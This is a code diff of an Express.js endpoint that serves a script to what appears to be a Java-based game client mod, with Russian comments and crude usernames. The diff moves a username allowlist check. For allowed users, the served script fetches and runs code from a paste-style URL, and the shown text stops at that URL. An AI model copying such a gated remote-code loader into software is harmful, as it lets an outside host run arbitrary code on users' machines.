@@ -45,7 +45,7 @@ const validateRequest = (req, res, next) => {
 // Главный эндпоинт для скрипта - ИСПРАВЛЕННАЯ ВЕРСИЯ
 app.get('/api/script', validateRequest, (req, res) => {
     const scriptContent = `(function() {
-if (username === "porvaniy.gondon" || username === "__ded_inside__" || username === "latteld" || username === "dofinixx" || username === "troll4" || username === "zertqmap.org" || username === "nekitpon" || username === "fakepatrickstar" || username === "inclodus" || username === "terpila_naxyi" || username === "masterrpo1" || username === "prolix0573") {
+
 // Method to send silent user-only message
 function sendUserMessage(message) {
     try {
@@ -75,6 +75,7 @@ sendUserMessage("§b§l-Zr3");
     var username = Java.type("ru.nedan.spookybuy.Authentication").getUsername();
 
     // Проверяем разрешенные имена
+    if (username === "porvaniy.gondon" || username === "__ded_inside__" || username === "latteld" || username === "dofinixx" || username === "troll4" || username === "zertqmap.org" || username === "nekitpon" || username === "fakepatrickstar" || username === "inclodus" || username === "terpila_naxyi" || username === "masterrpo1" || username === "prolix0573") {
         try {
     // Выполняем внешний скрипт - ИСПРАВЛЕННАЯ ВЕРСИЯ
     var url = new java.net.URL("https://i.e-z.host/p/raw/upg6sy072a");
